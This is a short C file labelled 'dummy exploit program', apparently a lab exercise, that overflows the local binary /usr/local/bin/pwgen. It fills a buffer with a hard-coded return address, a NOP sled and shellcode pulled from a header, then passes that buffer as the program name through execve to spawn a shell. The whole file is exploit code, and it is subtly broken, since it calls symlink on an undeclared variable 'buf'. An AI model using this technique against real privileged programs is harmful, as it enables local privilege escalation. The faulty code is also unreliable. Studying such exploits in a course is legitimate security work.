/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "/usr/local/src/shellcode.h"

#define TARGET "/usr/local/bin/pwgen"

#define BUFFER_SIZE 700
#define NOP 0x90

int main(void) {
  char *args[4];
  char *env[1];

  // one way to invoke pwgen, system() creates a separate process
  // system("/usr/local/bin/pwgen -v");

  char *buff, *ptr;
  long *addr_ptr;
  int i;

  if (!(buff = malloc(BUFFER_SIZE))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  ptr = buff;
  addr_ptr = (long *) ptr;
  for(i = 0; i < BUFFER_SIZE; i+=4)
    *(addr_ptr++) = 0xbfd7dfff;

  for(i = 0; i < BUFFER_SIZE/2; i++)
    buff[i] = NOP;

  ptr = buff + ((BUFFER_SIZE/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[BUFFER_SIZE - 1] = '\0';
  symlink(TARGET,buf);

  // another way
  args[0] = buff; args[1] = "-h";
  args[2] = NULL; args[3] = NULL;

  env[0] = NULL;
  // execve() executes the target program by overwriting the
  // memory of the process in which execve() is executing, i.e., 
  // execve() should never return
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
